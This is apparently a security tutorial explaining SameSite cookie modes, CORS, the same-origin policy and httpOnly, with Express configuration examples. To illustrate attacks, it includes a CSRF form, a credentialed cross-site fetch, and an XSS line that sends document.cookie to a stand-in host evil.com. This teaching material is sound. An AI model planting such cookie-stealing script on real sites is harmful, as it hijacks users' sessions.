
## Part 1: The Cookie Configuration You Copy-Paste

You've seen this code everywhere:

```javascript
res.cookie('sessionId', token, {
    httpOnly: true,
    secure: isProduction,
    sameSite: isProduction ? 'none' : 'lax',
    maxAge: 3600000,
    domain: isProduction ? '.yourdomain.com' : undefined
});
```

**But what is each line actually preventing?** Let's reverse engineer it.

# Part 2 — `SameSite`: the first line of defense

`SameSite` controls **when a cookie is sent** by the browser.

> A cookie is the browser token a website uses to identify you.

## `SameSite=Strict`

Cookies are sent **only** for same-site requests.

- Requests from `A.com` → `A.com` include Cookie A.
- Any request from `B.com` → `A.com` **does not** include Cookie A (cross-site requests are blocked).
    

Examples:

```text
A.com / POST ---(Cookie A)---> A.com    // Cookie sent
B.com / GET ---(X Cookie A)---> A.com   // Cookie NOT sent (cross-site)
```

Cross-site actions (requests initiated from another site) will not have the cookie attached when `SameSite=Strict`.

---

## `SameSite=Lax`

`Lax` is more permissive than `Strict`:

- Same-site requests: cookie is sent.
- Some cross-site **safe top-level navigations** (e.g., user clicking a normal link) will include the cookie.
- Cross-site non-GET requests (POST, PUT, etc.) **will not** include the cookie.
    

Examples:

```text
A.com / POST ---(Cookie A)---> A.com    // Cookie sent (same site)

// Cross-site GET via user navigation (link click)
B.com (link to A.com) ---(Cookie A)---> A.com   // Cookie sent

// Cross-site POST form submission
B.com / POST ---(X Cookie A)---> A.com  // Cookie NOT sent
```

> Under `SameSite=Lax`, a site like `B.com` can trigger a **GET** to `A.com` that will include `A.com`’s cookie — this can leak session-related capabilities. We’ll cover additional protections below.

---

## `SameSite=None`

Cookies are sent in **all contexts** (both same-site and cross-site), **but** `Secure` **must** also be set (cookie is sent only over HTTPS).

Examples:

```text
B.com / GET ---(Cookie A)---> A.com   // Cookie sent
B.com / POST ---(Cookie A)---> A.com  // Cookie sent
```

---

### FAQ: What happens when I visit `B.com` — does the browser attach `A.com` cookies to `B.com`?

Nothing special happens. Browsers only attach cookies that belong to the domain being requested. When you visit `B.com`, the browser will only look up and attach cookies for `B.com`. `A.com` cookies are not visible or accessible when browsing `B.com`.

---

# Part 3 — The loophole in `Lax` (why we need more)

**Problem:** `SameSite: Lax` allows certain cross-site GET requests to include cookies. That means an attacker can sometimes trigger reads (GETs) that carry your session cookie. To prevent data theft, we need another layer of protection.

---

# Part 4 — CORS: the second layer for GET requests

As noted above, under `SameSite=Lax` a cross-site GET can include cookies. An attacker **can** trigger a GET to your site and the request will reach the server and be processed. But modern browsers implement **CORS** to prevent unauthorized websites from **reading** those responses.

Example attack (under SameSite: lax):

![CORS mechanism diagram showing how browser blocks cross-origin requests](asset/cors-mechanism-diagram.png)

```text
Evil.com ---(Cookie A) /GET balance---> Bank.com
Evil.com ---(Cookie A) /GET messages---> Facebook.com
```

A fetch example:

```javascript
fetch('https://mybank.com/account-balance', {
  method: 'GET',
  credentials: 'include'
});
```

CORS behavior:

- The request reaches the server.
- The server processes it and returns a response.
- **But** the browser blocks the attacking site's JavaScript from **reading** the response unless the server explicitly authorizes that origin.
    

---

## What is `Origin` (Same Origin Policy — SOP)?

```
Origin = scheme + host + port
https://example.com:443
^^^^^   ^^^^^^^^^^^  ^^^
scheme     host      port
```

Each part matters:

- **Scheme** (http vs https) — different schemes are different origins. This prevents insecure pages from accessing secure resources.
- **Host** — different hostnames are different origins (`bank.com` vs `api.bank.com`).
- **Port** — same host + scheme but different port is a different origin (`:443` ≠ `:8080`).
    

SOP is strict by default and blocks cross-origin reads. CORS provides a controlled relaxation: the server can explicitly allow specific origins to read its responses.

---

## CORS: controlled relaxation of SOP

Server-side example (Express + cors):

```js
app.use(cors({
  origin: 'https://mysite.com',  // only this origin can read responses
  credentials: true
}));

// Response header sent:
// Access-Control-Allow-Origin: https://mysite.com
```

---

# Part 5 — `SameSite` vs CORS — the complete picture

They protect different attack surfaces:

|Feature|Purpose|Protects|
|---|---|---|
|**SameSite**|Controls whether cookies are **sent**|Protects **actions** (CSRF)|
|**CORS**|Controls whether JS can **read** responses|Protects **data** (exfiltration)|

### Examples

**Action protection (SameSite)**

```html
<!-- You're on: http://evil.com -->
<form action="https://mybank.com/transfer" method="POST">
  <input name="amount" value="10000">
</form>
```

- Without `SameSite`: cookie is sent → transfer could succeed.
- With `SameSite='lax'` or `Strict`: cookie is not sent → transfer rejected.
    

**Data protection (CORS)**

```javascript
// On evil.com
fetch('https://mybank.com/account-balance', {
  method: 'GET',
  credentials: 'include'
});
```

- `SameSite: Lax` allows the GET and sends the cookie.
- Server responds.
- **CORS** can block JavaScript on `evil.com` from reading the response — protecting sensitive data.
    

---

## Defense in depth: use both

Example secure cookie + CORS configuration:

```js
// Set cookie
res.cookie('sessionId', 'abc123', {
  httpOnly: true,   // protects against XSS reading the cookie
  sameSite: 'lax',  // protects against cross-site POST actions
  secure: true      // only send over HTTPS
});

// CORS: only let trusted origin read responses
app.use(cors({
  origin: 'https://mybank.com',
  credentials: true
}));
```

This combination defends against:

- XSS cookie theft (`httpOnly`)
- CSRF actions (`sameSite`)
- Cross-site data exfiltration (CORS)
    

---

# Important clarification

**Q: Does `document.cookie` return all browser cookies?**  
**A:** No — only cookies for the **current domain** are returned.

Example:

```javascript
// On https://mybank.com
console.log(document.cookie);
// e.g. "sessionId=abc123; userId=456; theme=dark"
// → Only mybank.com cookies
```

However, if an attacker can run JavaScript on your site (XSS), the attacker can still steal non-`httpOnly` cookies:

```html
You are on the bank.com &&
The hacker manage to embedded a line in JavaScipt.
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
  // This can leak sessionId if sessionId is not httpOnly
  // On Bank.com, You send Your Session ID to evil.com
</script>
```

Setting `httpOnly` on session cookies prevents `document.cookie` from exposing them:

```text
document.cookie  // "theme=dark"  ← sessionId invisible if httpOnly
```
